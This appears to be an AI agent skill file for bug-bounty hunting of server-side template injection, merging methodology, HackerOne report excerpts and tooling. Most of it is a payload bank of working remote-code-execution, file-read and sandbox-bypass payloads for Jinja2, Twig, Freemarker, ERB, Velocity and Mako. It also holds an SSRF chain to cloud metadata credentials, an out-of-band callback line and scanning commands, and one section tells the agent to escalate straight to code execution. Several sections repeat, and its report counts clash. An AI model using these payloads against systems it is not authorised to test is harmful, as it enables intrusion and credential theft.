---
name: bbhunt-ssti
description: "Use for user input evaluated by Jinja2, Twig, Freemarker, ERB, Velocity, Thymeleaf, Smarty, EJS, Pug or similar template engines. Unified from 3 upstream skills (cbh, h1skills, hunting). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# Server-Side Template Injection — unified skill

> **Complete merged skill.** Everything from 3 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus is contained in this file. Unmodified originals remain in `references/` for provenance only.

## Corpus evidence — 7 valid HackerOne reports (1 paid / 14%)

Every disclosed report is valid; payment is an impact signal, not a validity test.

### Techniques ranked across ALL valid reports

| Technique | Reports |
|---|---:|
| admin / privileged-role context | 1 |
| internal service / port / container | 1 |
| template injection (SSTI) | 1 |

### Parameters observed in writeups



### Bypass primitives observed



### Impact language observed

`password` (2), `sensitive information` (1), `admin` (1), `credential` (1)

### Case studies — full excerpts (paid and unpaid)

#### [301406](https://hackerone.com/reports/301406) — Unrestricted File System Access via Twig Template Injection on dev-ucrm-billing-demo.ubnt.com

Ubiquiti Inc. · no bounty — still valid · high

The researcher found a Local File inclusion vulnerability, this could be exploited by using Twig templates available on the system. This vulnerability only have the potential to affect `dev-ucrm-billing-demo.ubnt.com`, although is limited by the restricted environment (docker) with don't allow any sensitive information leak. This vulnerability don't have any impact and don't offer any threat for regular installations of UCRM, because the attacker need admin credentials, also the environment is isolated by a docker container.

#### [1265344](https://hackerone.com/reports/1265344) — Self-DoS due to template injection via email field in password reset form on access.acronis.com

Acronis · no bounty — still valid · none

## Summary HI acronis security team , how are you I hope everyone is OK in the other side of the screen . I found Template Injection in [ via the mail input . ## Steps To Reproduce: 1. Open [ and Enter the mail Payload : sudo_bash{{8*8}}@wearehackerone.com 2. After submite the mail , The resulte will Reflect in the page with the mail adress . ## Impact - AngularJs CCTI may lead to xss .

#### [301406](https://hackerone.com/reports/301406) — Unrestricted File System Access via Twig Template Injection on dev-ucrm-billing-demo.ubnt.com

Ubiquiti Inc. · no bounty — still valid · high

The researcher found a Local File inclusion vulnerability, this could be exploited by using Twig templates available on the system. This vulnerability only have the potential to affect `dev-ucrm-billing-demo.ubnt.com`, although is limited by the restricted environment (docker) with don't allow any sensitive information leak. This vulnerability don't have any impact and don't offer any threat for regular installations of UCRM, because the attacker need admin credentials, also the environment is isolated by a docker container.

#### [1265344](https://hackerone.com/reports/1265344) — Self-DoS due to template injection via email field in password reset form on access.acronis.com

Acronis · no bounty — still valid · none

## Summary HI acronis security team , how are you I hope everyone is OK in the other side of the screen . I found Template Injection in [ via the mail input . ## Steps To Reproduce: 1. Open [ and Enter the mail Payload : sudo_bash{{8*8}}@wearehackerone.com 2. After submite the mail , The resulte will Reflect in the page with the mail adress . ## Impact - AngularJs CCTI may lead to xss .

### Recurring approach patterns from real reports

- 1× the researcher found a local file inclusion vulnerability this could be exploited by using twig templates available on the system
- 1× i found template injection in via the mail input

## Corpus-backed method (this class)

1. Detect with a harmless arithmetic expression in the exact context (name, email, subject, template preview).
2. Identify the engine using a decision tree and error messages, not a blind RCE payload.
3. Confirm expression evaluation with a unique marker before escalating.
4. Find a sandbox escape appropriate to the identified engine and version; prefer a non-destructive proof.
5. Test second-order SSTI: a value stored in a profile and rendered later in an email or PDF.
6. Prove code execution or file read with an unambiguous callback/output and document the engine.

### Signals

- Input rendered into a template rather than printed directly
- Math-expression evaluation in a response
- Email/subject/PDF/document generation using templates

### Kill criteria

- Input is escaped or treated as a literal value.
- No expression evaluation — only reflected text.
- Engine sandbox prevents escalation and no consequence is demonstrated.

### Escalation chains

- SSTI -> RCE -> internal access.
- Stored SSTI -> admin-side rendering -> higher privilege.

### Probes

- ${7*7}, {{7*7}}, <%= 7*7 %>, #{7*7}, template-specific syntax; observe for 49.

### Veteran tip

The operator's notes: identify engine first with a decision tree, then exploit — never skip detection.

## Unified upstream methodology (complete, deduplicated)

### Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Fuzz template syntax: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`.
- Identify the engine from output and error messages.
- Escalate to file read/RCE with engine-specific payloads.
- Check email templates, PDF/report generators, and theme editors.

### Deeper checklist

- Fuzz template syntax: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`.
- Identify the engine from evaluated output and error messages.
- Escalate to file read/RCE with engine-specific payloads.
- Check sandbox escapes and filter bypasses.
- Look at email templates, PDF/report generators, and theme editors.
- Prove execution with a harmless callback or command output.

### Autonomous Testing Priority

**Escalate straight to RCE — don't stop at arithmetic detection.**

Arithmetic probes (`{{7*7}}→49`) confirm the injection point but are not proof of impact. The real goal is OS command execution. Arithmetic detection also fails silently when the app echoes the input back (e.g. inside an HTML attribute like `<input value="{{7*7}}">`), producing a false negative even when injection exists.

**Order of attack:**
1. **Try Jinja2 RCE first** (covers Python/Flask — the most common stack in modern web apps):
   ```
   {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   ```
2. **If the endpoint is a traditional web form**, send as form-encoded body — NOT JSON:
   ```
   Content-Type: application/x-www-form-urlencoded
   field={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   ```
   JSON bodies are silently ignored by form-processing endpoints (`request.form['field']` sees nothing).
3. **If Jinja2 fails**, try Twig (PHP/Symfony): `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
4. **Fall back to arithmetic detection** only to fingerprint the engine when RCE payloads fail.

**Proof:** Command output (`uid=N(user) gid=...`) in the response confirms RCE. If the output appears in HTML (inside a `<div>` or `<pre>`), that still counts — the format is irrelevant, the content is the evidence.

---

### A. Discovery checklist — concrete places, params, headers, file types to look

- Treat any field whose value is re-rendered through a template as a candidate: `name`, `message`, `subject`, `email`, `preview`, `theme`, `description`, `bio`, invoice/product name, PDF/report title, and CMS "edit template" bodies.
- Highest-yield sinks are stored-and-rendered surfaces, not just the immediate HTTP response: outbound email templates (profile name rendered into a confirmation mail), invoice/PDF generators, "documentation"/template-editor preview forms, and admin CMS template editors.
- Probe the full syntax matrix at each candidate — a single-engine probe silently misses polyglot-capable sinks. Send `{{7*7}}`, `${7*7}`, `#{7*7}`, `<%= 7*7 %>`, `*{7*7}`, `@(7*7)` (Razor), `{php}echo 7*7;{/php}` (Smarty).
- Code-context probing: when input lands *inside* an expression, break out — e.g. `greeting=data.username}}<tag>` — and look for the literal tag rendered alongside the value.
- Fingerprint with the all-syntax fuzz string ` ${{<%[%'"}}%\ `; the resulting error text commonly names Handlebars, Jinja2, Twig, or Freemarker (PortSwigger "unknown language" lab pattern).
- The "SSTI using documentation" class lives behind authenticated template editors — enumerate CMS/admin routes, not only public forms. A record id is usually a query param (`?productId=N`) while the body carries `csrf`, `template`, and `template-action=preview|save`.
- Enumerate in-scope engine/environment objects: `${T(java.lang.System).getenv()}` (Java), `{{config}}` (Flask/Jinja2 — leaks `SECRET_KEY`), `_self` (Twig 1.x), `product` (Freemarker labs). Non-standard developer-supplied objects are the softest target in a sandbox.
- New 2025-2026 surface: LLM/agent "text processing"/"script"/prompt-template configuration fields. RAGFlow GHSA-vvwj-fvwh-4whx (2026) used unsandboxed `jinja2.Template` on a user-set Script field → OS command execution.
- Check export/report/screenshot endpoints and email-queue previews, where the rendered output is delayed or delivered to a different channel.

### Signals and surfaces

### Signal

- Reports: **28** · paid: **6**
- Median bounty **$2,150** · p90 **$10,000** · max **$10,000** · total **$18,550**
- Median upvotes **26**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| Uber | 2 | $13,000 | 172 |
| GitHub Security Lab | 4 | $2,300 | 54 |
| Mail.ru | 2 | $2,000 | 166 |
| Shopify | 2 | $1,000 | 440 |
| Nextcloud | 1 | $250 | 17 |
| GitHub | 2 | $0 | 141 |
| WordPress | 2 | $0 | 41 |
| Unikrn | 1 | $0 | 122 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`template` `name` `message` `email` `subject` `preview` `report` `theme`

### Techniques, payloads and bypasses

### Payloads & probes

- Jinja2 -> `{{config}}` `{{cycler.__init__.__globals__.os.popen('id').read()}}`
- Twig -> `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}`
- Freemarker -> `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- ERB -> `<%= system('id') %>`

### Payload bank

**37 curated payloads** in 5 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.

### Bypass tricks

- Bypass filters with string concatenation, `attr`, `|join`, and hex escapes.
- Use sandbox escapes for the specific engine/version.
- Blind SSTI via time delays or OOB.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **H1514 Server Side Template Injection in Return Magic email templates?** — `#423541` · Shopify · $0 · ▲409
  > `{{ this. proto .constructor.name }}` -- `Object`
- **uber.com may RCE by Flask Jinja2 Template Injection** — `#125980` · Uber · $10,000 · ▲137
  > First, if you change your profile name to {{ '7' 7 }}, and you will receive a mail
- **Urgent: Server side template injection via Smarty template allows for RCE** — `#164224` · Unikrn · $0 · ▲122
  > To start, I began with the payload {7 7} and received a template error in the email I received {F115749} Recognizing the injection, I then was able to confirm the version of smarty used via {$smarty.version} {F115750} Next I was able to test {php} tags by…
- **Management Console Editor Privilege Escalation to Root SSH Access in GitHub Enterprise Server via nomad template injection and audit-forward** — `#2332623` · GitHub · $0 · ▲80
  > A command injection vulnerability was identified in GitHub Enterprise Server that allowed an attacker with an editor role in the Management Console to gain admin SSH access to the appliance via nomad templates when configuring audit log forwarding.
- **Management Console Editor Privilege Escalation to Root SSH Access in GitHub Enterprise Server via nomad template injection** — `#2332551` · GitHub · $0 · ▲61
  > A command injection vulnerability was identified in GitHub Enterprise Server that allowed an attacker with an editor role in the Management Console to gain admin SSH access to the appliance via nomad templates when configuring SMTP options.
- **Unrestricted File System Access via Twig Template Injection on dev-ucrm-billing-demo.ubnt.com** — `#301406` · Ubiquiti Inc. · $0 · ▲47
  > This vulnerability only have the potential to affect `dev-ucrm-billing-demo.ubnt.com`, although is limited by the restricted environment (docker) with don't allow any sensitive information leak.
- **Client Side Template Injection to Stored XSS in Image Collection** — `#2234564` · Mars · $0 · ▲39
  > Client-side template injection vulnerabilities arise when applications using a client-side template framework dynamically embed user input in web pages.
- **Reflected XSS on developer.uber.com via Angular template injection** — `#125027` · Uber · $3,000 · ▲35
  > `https://developer.uber.com/docs/deep-linking?q=wrtz{{( ="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor( . proto ,$).value,0,"alert(1)")()}}zzzz`
- **XSS in $shop$.myshopify.com/admin/ via twine template injection in "Shopify.API.Modal.input" method when using a malicious app** — `#217790` · Shopify · $1,000 · ▲31
  > The method wraps the attribute value in a [with](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/with) block to provide named variables and passes it to a…
- **[mercantile.wordpress.org] Reflected XSS via AngularJS Template Injection** — `#230234` · WordPress · $0 · ▲29
  > I came across a potential exploitation vector after noticing that a search query for `{{2 2}}` returned `4` in the site title response.
- **Server Side Template Injection on Name parameter during Sign Up process** — `#1104349` · Glovo · $0 · ▲28
  > In this scenario, when an attacker signs up on the platform and uses a payload in the First Name field, the payload is rendered server side and it gets executed in the promotional/welcome emails sent to the user
- **SSTI leads to Command injection** — `#3584149` · curl · $0 · ▲25
  > unhanticated Rce via command line with sleep break the server until finish the request
- **Unauthenticated SSRF in 3rd party module "cerdic/csstidy"** — `#1595006` · Nextcloud · $250 · ▲17
  > To download remote data as CSS file, either use the interface or try this: http://example.com/apps/mail/vendor/cerdic/css-tidy/css optimiser.php?url=http://localhost/apps/richdocuments/docs/custom.css&custom=1&template=4
- **Client-side Template Injection in Search, user email/token leak and maybe sandbox escape** — `#271960` · Rockstar Games · $0 · ▲15
  > We resolved this issue by updating our version of AngularJS, and by applying the `ng-non-bindable` directive to the vulnerable fields.
- **[marketplace.informatica.com] -  Template Injection** — `#299241` · Informatica · $0 · ▲12
  > The researcher has identified and reported a "Template Injection" vulnerability in one of Informatica's domain and helped us in resolving the issue.
- **Stored xss via template injection** — `#250837` · WordPress · $0 · ▲12
  > 3.change name to {{constructor.constructor('alert(1)')()}} & forward request.
- **Server-side Template Injection in lodash.js** — `#904672` · Node.js third-party modules · $0 · ▲8
  > Step 3: Visit the vulnerable application and enter a payload such as `${JSON.stringify(process.env)}` into the `name` parameter e.g.
- **Self-DoS due to template injection via email field in password reset form on access.acronis.com** — `#1265344` · Acronis · $0 · ▲7
  > Open [https://access.acronis.com/reset password/new] and Enter the mail Payload : sudo bash{{8 8}}@wearehackerone.com
- **XSS via Client Side Template Injection on www.███/News/Speeches** — `#1736317` · U.S. Dept Of Defense · $0 · ▲6
  > `https://www.████/News/Speeches/?Search={{window['eval'](window['atob'](window['decodeURIComponent']('BASE 64 ENCODED PAYLOAD')))}}`
- **Server-side template injection at ujs test server** — `#942103` · Ruby on Rails · $0 · ▲5
  > https://github.com/rails/rails/blob/v6.0.3.2/actionview/test/ujs/server.rb

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 2× | `{php}$s = file_get_contents('/etc/passwd',NULL, NULL, 0, 100); var_dump($s);{/php}` |
| 2× | `{{7*7}}` |
| 2× | `{{...}}` |
| 1× | `{{ this }}` |
| 1× | `{{ this.__proto__ }}` |
| 1× | `{{ this.__proto__.constructor.name }}` |
| 1× | `https://<shop>.myshopify.com/admin/apps/returnmagic` |
| 1× | `{{this}}` |
| 1× | `{php}print "Hello"{/php}` |
| 1× | `{F115751}. Finally I used file_get_contents to begin extracting the etc/pass file` |
| 1× | `-alert(document.domain)-` |
| 1× | `with($context) { / with($registry) { / return {typedInput: ''-alert(document.domain)-''} / } / }` |
| 1× | `window.parent.postMessage(JSON.stringify({ / message: "Shopify.API.Modal.input", / data: { / message: { / message: "", / value: "'-alert(doc` |
| 1× | `/admin/oauth/authorize?client_id=5b7bd427b8caa69610bf85d1c87d4a04&scope=read_products&redirect_uri=https://attackerdoma.in/a4d76231-8657-48e` |
| 1× | `/admin/apps/$id` |
| 1× | `shopify-whitehat-1@bored.engineer` |
| 1× | `$your-shop$.myshopify.com` |
| 1× | `https://mercantile.wordpress.org/search/{{constructor.constructor('alert(document.domain)')()}}` |
| 1× | `{{2*2}}` |
| 1× | `curl -os{popen('sleep 10').read()} --url gyvgzienwleealjmudejwl83p3p29bxi9.oast.fun` |

### Detection Payloads (try all)

```
{{7*7}}          → 49 = Jinja2 / Twig
${7*7}           → 49 = Freemarker / Velocity / Mako (all use ${...})
<%= 7*7 %>       → 49 = ERB (Ruby)
*{7*7}           → 49 = Spring Thymeleaf
{{7*'7'}}        → 7777777 = Jinja2 (Python string repetition); 49 = Twig (numeric coercion of '7'). Differentiates Jinja2 from Twig.
```

### RCE Payloads

**Jinja2 (Python/Flask):**
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Twig (PHP/Symfony):**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**ERB (Ruby):**
```ruby
<%= `id` %>
```

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- Error-based blind SSTI: PortSwigger's #1 technique of 2025 ("Successful Errors: New Code Injection and SSTI Techniques") adapts SQL-style boolean/time error oracles to template expressions, letting you exfiltrate evaluated output with conditional error triggering and no time delays. Use polyglot probes to detect the class comprehensively.
- Quote-free, plugin-free RCE (Brumens / YesWeHack, Ekoparty 2024): build strings from engine globals instead of literals — Jinja2 `{{ self.__init__.__globals__.__str__()[1786:1788] }}` slices `"id"` out of the globals string; fire via `os.popen(str().join(chr(i) for i in [105,100])).read()`. Twig uses `block` + the built-in `_charset` variable.
- Jinja2 class-walker ladder, in order: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` → `{{ cycler.__init__.__globals__.os.popen('id').read() }}` → `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`; when dunder attributes are blocked, enumerate `''.__class__.__mro__[1].__subclasses__()` and hunt the `subprocess.Popen` index.
- Twig 1.x: `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}`. Twig 2+ removed `_self` env access — pivot to `{{ ['id']|map('system')|join(',') }}`, an exposed evaluator helper, or a sandbox bypass.
- Concrete 2025 Grav sandbox-bypass shapes: `{{ grav.twig.twig.registerUndefinedFunctionCallback('system') }}{% set a = grav.config.set('system.twig.undefined_functions',false) %}{{ grav.twig.twig.getFunction('id') }}` (CVE-2025-66294); whitelist poisoning via `{{ grav.twig.twig_vars['config'].set('system.twig.safe_filters', {'1':'system'}) }}{{ 'id'|system }}` (CVE-2025-66299). Weak regex cleaners that blacklist `call_user_func`/`read_file`/`undefined_functions` can be defeated by nesting the forbidden token inside its own replacement marker.
- Freemarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`; in a sandbox where `?new()` is denied, read a file via the object chain `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}` and decode the decimal bytes.
- Mako native block: `<% import os; x=os.popen('id').read() %>${x}`. ERB: `<%= Dir.entries('/') %>` and `<%= File.open('/etc/passwd').read %>`. Velocity: `$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")`. Handlebars: constructor-access `{{#with "s" as |string|}}...` chain from the PortSwigger lab.
- If runtime access is impossible, do not discard the finding: template engines often expose URL fetchers/filters first (SSRF via a `include()`/fetch filter), and unrendered output often yields stored XSS or path traversal.
- Sandbox discipline: `SandboxedEnvironment`/`ImmutableSandboxedEnvironment` genuinely blocks the classic dunder walk, but it is not absolute — look for developer-supplied objects, unsafe custom filters, and version-specific escapes rather than assuming the sandbox ends the test.

### Validation and proof

### Blind / OOB

```text
{{7*'7'}}
{{lipsum.__globals__['os'].popen('sleep 5').read()}}
${T(java.lang.Runtime).getRuntime().exec('sleep 5')}
<%= sleep(5) %>
{{range(1000000000)}}
```

Copyable lists:
- `~/.local/share/hackerone-reports/wordlists/payloads_ssti.txt` (37)

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

### C. Validation / proof bar — how to confirm and avoid false positives

- Arithmetic reflection (`{{7*7}} → 49`) is detection, not impact. Claim Critical only after command output (`uid=...`) or a unique Collaborator/interactsh callback fired from inside the evaluated payload.
- A payload echoed literally (HTML-escaped, or inside an attribute) is a false positive. Confirm evaluation in the real sink — the email body, exported PDF, or preview pane — not merely the immediate response.
- Differentiate engines with at least two probes: `{{7*'7'}}` returns `7777777` on Jinja2 but `49` on Twig; `${7*7}`+`#{7*7}` together indicate Freemarker.
- Sandboxed/expression-only evaluation with no runtime access is Medium SSTI, not Critical RCE. Prove file read or command execution before raising severity.
- Respect content type: JSON bodies are silently ignored by form-processing endpoints (`request.form['field']` sees nothing) — replay as `application/x-www-form-urlencoded`.
- Re-fetch CSRF for each iteration; use `template-action=preview` to iterate without persisting, then `save` and trigger the public render only once the payload is correct.
- Reproduce verbatim twice and retain the raw request/response showing the exact field, content type, and evaluated output.

**Engine-discriminator matrix (record which probes actually evaluate):**
- `{{7*7}} → 49` — Jinja2, Twig, Smarty (`{php}` variant), Nunjucks.
- `{{7*'7'}} → 7777777` — Jinja2 string repetition; `49` — Twig numeric coercion.
- `${7*7} → 49` and `#{7*7} → 49` — Freemarker (Java); `{{7*7}}` does nothing here.
- `<%= 7*7 %> → 49` — ERB (Ruby). `*{7*7} → 49` — Thymeleaf (Spring).
- `@(7*7) → 49` — Razor (.NET). `#set($x=7*7)$x → 49` — Velocity.
- Error text naming `Handlebars`, `Freemarker`, `Twig`, or a Java stack trace is a strong engine ID even when math probes fail.

**Common false-positive patterns to actively rule out:**
- The app HTML-escapes `{{7*7}}` and shows it literally — template syntax is being treated as data.
- A WAF 403 on `{{` or `${` is a filter hit, not evaluation; try the alternative delimiters and encoded/unicode variants.
- A blank response after an RCE payload usually means an exception was thrown, not that the command ran — look for the command output or use an OOB callback.
- Output that appears only in a *different* channel (email, PDF, log) is still real SSTI; failure to see it in the HTTP response is not a false negative if you can read that channel.
- Arithmetic evaluation inside a sandbox (e.g., Twig sandbox mode, Jinja2 `SandboxedEnvironment` with no escape) is Medium SSTI, never Critical RCE.

**Severity decision discipline:**
- Unauthenticated template-editor access or a public form reaching unsandboxed Jinja2/Freemarker/Twig → Critical RCE.
- Authenticated editor reaching RCE (CMS admin, LLM agent config) → High; still report if the privilege boundary is weaker than intended (e.g., any editor, not just admin).
- Sandboxed engine with confirmed file read → High; expression evaluation only → Medium.
- Template-name/include control (input chooses which template file to load) → treat as LFI/path traversal and test with `../../etc/passwd` rather than arithmetic probes.
- When reporting, include the engine name, the exact field and content type, the fingerprint probes, and the final RCE/file-read evidence as separate steps — this is the documented PortSwigger exploitation workflow (Read → Explore → Create a custom attack).
- Remember the OWASP caveat: auto-escaping prevents XSS in printed values but does not prevent SSTI, because escaping applies to values the engine prints, not to template code it has already parsed — do not dismiss a sink because output is HTML-escaped.

### Escalation and related chains

### Escalation chains

- SSTI -> RCE.
- SSTI -> file read -> creds.

### Management Console Editor Privilege Escalation to Root SSH Access in GitHub Enterprise Server via nomad template injection and audit-forward

`#2332623` · GitHub · $0 · high · 2024-09-13 · ▲80
> A command injection vulnerability was identified in GitHub Enterprise Server that allowed an attacker with an editor role in the Management Console to gain admin SSH access to the appliance via nomad templates when configuring audit log forwarding. Exploitation of this vulnerability required access to the GitHub Enterprise Server instance and access to the Management Console with the editor role.

### Related Skills & Chains

- **`rce`** — SSTI is the easiest path to RCE on Python/Ruby/PHP/Java stacks because the template language already exposes the runtime. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or Freemarker `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` → unauthenticated RCE as the rendering worker. Always escalate fingerprint → class-walker → cmd exec.
- **`xss`** — When the template engine sandboxes the runtime (or you only get the rendered output back as HTML), the same `{{7*7}}` reflection often still yields stored XSS. Chain primitive: sandboxed Jinja2 SSTI without escapes → inject `<script>` into rendered email template → stored XSS hitting every recipient who views the message.
- **`ssrf`** — Template engines often expose URL fetchers/filters before they expose the runtime, giving you SSRF before RCE. Chain primitive: Twig `{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}` or Jinja2 with `url_for`/custom filters → AWS metadata exfil → cloud creds.
- **`file-upload`** — Office docs, SVGs, and email templates uploaded by the user are common SSTI surfaces (the server re-renders them). Chain primitive: upload a DOCX whose `word/document.xml` contains `${T(java.lang.Runtime).getRuntime().exec("id")}` to a Velocity/Freemarker-driven mail-merge → RCE.
- **`security-arsenal`** — Reach for the engine-specific escape payload tree: Jinja2 class-walker variants (`__subclasses__()[N]` index hunting), Twig `_self.env` registerUndefinedFilterCallback, Freemarker `?new()` Execute, ERB backticks, Velocity `$class.inspect`, Smarty `{php}...{/php}`, plus the WAF-bypass variants (`{{request|attr('application')|...}}`, Unicode escapes, `{%print(...)%}`).
- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical RCE. A `{{7*7}} → 49` reflection inside a sandboxed engine (e.g., Twig sandbox mode, Jinja2 SandboxedEnvironment with no escape) is Medium SSTI, not Critical RCE. Prove `id`/OOB DNS callback with a unique marker before writing the report.

---

### Related Skills & Chains

- **`hunt-rce`** — SSTI is the easiest path to RCE on Python/Ruby/PHP/Java stacks because the template language already exposes the runtime. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or Freemarker `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` → unauthenticated RCE as the rendering worker. Always escalate fingerprint → class-walker → cmd exec.
- **`hunt-xss`** — When the template engine sandboxes the runtime (or you only get the rendered output back as HTML), the same `{{7*7}}` reflection often still yields stored XSS. Chain primitive: sandboxed Jinja2 SSTI without escapes → inject `<script>` into rendered email template → stored XSS hitting every recipient who views the message.
- **`hunt-ssrf`** — Template engines often expose URL fetchers/filters before they expose the runtime, giving you SSRF before RCE. Chain primitive: Twig `{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}` or Jinja2 with `url_for`/custom filters → AWS metadata exfil → cloud creds.
- **`hunt-file-upload`** — Office docs, SVGs, and email templates uploaded by the user are common SSTI surfaces (the server re-renders them). Chain primitive: upload a DOCX whose `word/document.xml` contains `${T(java.lang.Runtime).getRuntime().exec("id")}` to a Velocity/Freemarker-driven mail-merge → RCE.
- **`security-arsenal`** — Reach for the engine-specific escape payload tree: Jinja2 class-walker variants (`__subclasses__()[N]` index hunting), Twig `_self.env` registerUndefinedFilterCallback, Freemarker `?new()` Execute, ERB backticks, Velocity `$class.inspect`, Smarty `{php}...{/php}`, plus the WAF-bypass variants (`{{request|attr('application')|...}}`, Unicode escapes, `{%print(...)%}`).
- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical RCE. A `{{7*7}} → 49` reflection inside a sandboxed engine (e.g., Twig sandbox mode, Jinja2 SandboxedEnvironment with no escape) is Medium SSTI, not Critical RCE. Prove `id`/OOB DNS callback with a unique marker before writing the report.

### Tools and wordlists

### Tools

`tplmap` · `SSTImap` · `Burp` · `interactsh`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_ssti.txt` | 21 |
| `~/.local/share/hackerone-reports/wordlists/params_ssti.txt` | 12 |
| `~/.local/share/hackerone-reports/wordlists/payloads_ssti.txt` | 37 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_ssti.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_ssti.txt \
     -mr 'canary|error|invalid|not found' -rate 40
ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_ssti.txt \
     -mr '<hit-marker>' -rate 20
```

### Nuclei

Test name/email/subject/template/preview fields; confirm engine before RCE.

```sh
nuclei -u https://target -tags ssti \
       -severity low,medium,high,critical -rl 40 -o nuclei_ssti.txt
nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/ssti -dast \
       -rl 40 -o nuclei_ssti_ssti.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Sources and related reading

### Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class ssti --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class ssti
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class ssti
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class ssti --min-bounty 1000
```

### Related

- `hackerone-rce` (1,399 reports)
- `hackerone-xss` (2,569 reports)

### Related

- `rce` (1,399 reports)
- `xss` (2,569 reports)

### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/web-security/server-side-template-injection/exploiting
2. https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Template_Injection_Prevention_Cheat_Sheet.html
3. https://portswigger.net/research/top-10-web-hacking-techniques-of-2025

### Additional notes

### Detection polyglots

```text
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
{7*7}
*{7*7}
@(7*7)
{{7*'7'}}
${7*'7'}
{{7*7}}${7*7}<%= 7*7 %>#{7*7}
${{7*7}}
{{= 7*7}}
```

### Jinja2 / Twig / Python

```text
{{config}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
{{['id']|filter('system')}}
{{['id']|map('system')|join}}
{% for x in range(3) %}x{% endfor %}
```

### Freemarker / Velocity / Java

```text
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
#set($x=7*7)$x
#set($e="".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id"))
$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")
#foreach($i in [1..3])$i#end
```

### ERB / Ruby / Rails

```text
<%= 7*7 %>
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
<%= File.read('/etc/passwd') %>
<%= Rugged::Repository.new('/').head.target_id %>
```

### Parameters observed

`url` · `name` · `Search` · `client_id` · `scope` · `redirect_uri` · `state` · `custom` · `template` · `signature` · `content_type` · `content`

### H1514 Server Side Template Injection in Return Magic email templates?

`#423541` · Shopify · $0 · n/a · 2019-04-04 · ▲409
> Summary: Possible template injection in return magic email templates. Description: I've been playing with return magic workflow email templates and there seems to be some kinda of template injection but I am not sure if it's exploitable or even valid. Here is why I think it could be vulnerable: I set the email template to the following and then test the template and then the results go to my gmail inbox. {{ this }} - [Object Object] {{ this.

